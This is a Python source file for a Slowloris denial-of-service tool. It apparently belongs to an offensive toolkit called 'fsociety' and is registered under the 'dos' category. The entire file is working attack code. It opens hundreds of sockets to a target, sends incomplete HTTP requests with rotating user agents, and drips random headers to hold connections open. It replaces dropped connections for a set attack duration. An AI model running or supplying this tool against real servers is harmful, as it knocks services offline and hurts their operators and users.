from __future__ import annotations

import random
import socket
import ssl
import string
import threading
import time
import urllib.parse

from fsociety.core.base import tool
from fsociety.core.logger import Log

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

class _Target:
    def __init__(self, host: str, port: int, use_ssl: bool, insecure: bool, path: str):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.insecure = insecure
        self.path = path

    def build_socket(self) -> socket.socket | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((self.host, self.port))
            if self.use_ssl:
                ctx = ssl.create_default_context()
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.host)
            return s
        except Exception:
            return None

    def handshake(self, sock: socket.socket) -> bool:
        try:
            req = (
                f"GET {self.path}?{random.randint(1, 99999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
            ).encode()
            sock.send(req)
            return True
        except Exception:
            return False

@tool("slowloris", "Layer 7 connection exhaustion via slow partial headers", category="dos")
class Slowloris:
    @staticmethod
    def build_parser(p):
        p.add_argument("target", help="Target host or URL")
        p.add_argument("--port", type=int, default=80)
        p.add_argument("--sockets", type=int, default=500, help="Concurrent connections")
        p.add_argument("--rate", type=float, default=10.0, help="Seconds between header drips")
        p.add_argument("--duration", type=int, default=300, help="Attack duration in seconds")
        p.add_argument("--insecure", action="store_true", help="Ignore TLS verification")

    @staticmethod
    def _random_header() -> bytes:
        key = "".join(random.choices(string.ascii_letters, k=random.randint(4, 12)))
        val = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 32)))
        return f"X-{key}: {val}\r\n".encode()

    @staticmethod
    def _spawn(tgt: _Target) -> socket.socket | None:
        s = tgt.build_socket()
        if not s:
            return None
        if not tgt.handshake(s):
            try: s.close()
            except Exception: pass
            return None
        return s

    @staticmethod
    def _drip_worker(tgt: _Target, sockets_list: list, rate: float, stop_event: threading.Event, lock: threading.Lock, target_count: int):
        while not stop_event.is_set():
            with lock:
                snapshot = list(sockets_list)

            for s in snapshot:
                try:
                    s.send(Slowloris._random_header())
                except Exception:
                    with lock:
                        if s in sockets_list:
                            sockets_list.remove(s)
                    try: s.close()
                    except Exception: pass

            with lock:
                need = target_count - len(sockets_list)

            for _ in range(max(0, need)):
                if stop_event.is_set(): break
                new_sock = Slowloris._spawn(tgt)
                if new_sock:
                    with lock:
                        sockets_list.append(new_sock)

            time.sleep(rate)

    @staticmethod
    def run(args, log: Log) -> int:
        parsed = urllib.parse.urlparse(args.target if "://" in args.target else f"http://{args.target}")
        host = parsed.hostname or args.target
        path = parsed.path or "/"
        use_ssl = parsed.scheme == "https" or args.port == 443
        port = parsed.port or args.port

        tgt = _Target(host, port, use_ssl, args.insecure, path)
        log.info(f"Slowloris target: {host}:{port} (TLS: {use_ssl}) | Sockets: {args.sockets} | Rate: {args.rate}s")

        stop_event = threading.Event()
        sockets_list = []
        lock = threading.Lock()

        log.info("Opening sockets...")
        for i in range(args.sockets):
            if stop_event.is_set(): break
            s = Slowloris._spawn(tgt)
            if s:
                with lock:
                    sockets_list.append(s)

        with lock:
            log.ok(f"Established {len(sockets_list)} live sockets")

        dripper = threading.Thread(
            target=Slowloris._drip_worker,
            args=(tgt, sockets_list, args.rate, stop_event, lock, args.sockets),
            daemon=True,
        )
        dripper.start()

        start = time.time()
        try:
            while time.time() - start < args.duration:
                time.sleep(5)
                with lock: alive = len(sockets_list)
                log.info(f"alive: {alive}/{args.sockets} | elapsed: {int(time.time() - start)}s")
        except KeyboardInterrupt:
            log.warn("Interrupted by user.")

        stop_event.set()
        dripper.join(timeout=2)
        with lock:
            for s in sockets_list:
                try: s.close()
                except Exception: pass
            sockets_list.clear()
        log.ok("Slowloris finished.")
        return 0
